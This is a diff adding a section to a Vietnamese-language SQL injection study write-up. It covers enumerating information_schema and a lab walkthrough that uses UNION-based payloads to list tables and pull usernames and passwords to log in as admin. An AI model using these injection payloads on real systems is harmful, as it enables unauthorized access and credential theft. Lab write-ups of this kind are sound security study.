@@ -362,3 +362,63 @@ Check version với query `' UNION SELECT @@version, NULL#` phải `trl + U` tr�
 ![img](../asset/sqli-8-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft-2.png)
 
 ---
+
+2. _Listing the contents of the database_
+   > Hầu như các loại db trừ Oracle đều có `information schema` (lược đồ thông tin)
+
+Có thể query `information_schema.tables`:
+
+```
+SELECT * FROM information_schema.tables
+```
+
+Return:
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+Có thể query ra các cột trong bảng với query:
+
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+Return:
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+
+### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+> Des: Phòng thí nghiệm này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, do đó bạn có thể sử dụng một cuộc tấn công UNION để lấy dữ liệu từ các bảng khác.
+
+> Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu chứa một bảng chứa tên người dùng và mật khẩu. Bạn cần xác định tên của bảng này và các cột mà nó chứa, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.
+
+> Để giải quyết phòng thí nghiệm, hãy đăng nhập với tư cách là người dùng quản trị viên
+
+Đầu tiên thì vẫn check cột:
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-0.png)
+
+Biết có 2 cột và tiếp theo là check type của từng column:
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-1.png)
+
+Sau đó check các table với query `' UNION SELECT table_name, NULL FROM information_schema.tables--`:
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-2.png)
+
+Tìm bảng tới prefix là `users`:
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-3.png)
+
+Có thông tin rồi thì cứ theo dấu vết mà truy:
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-4.png)
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-5.png)
+![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-6.png)
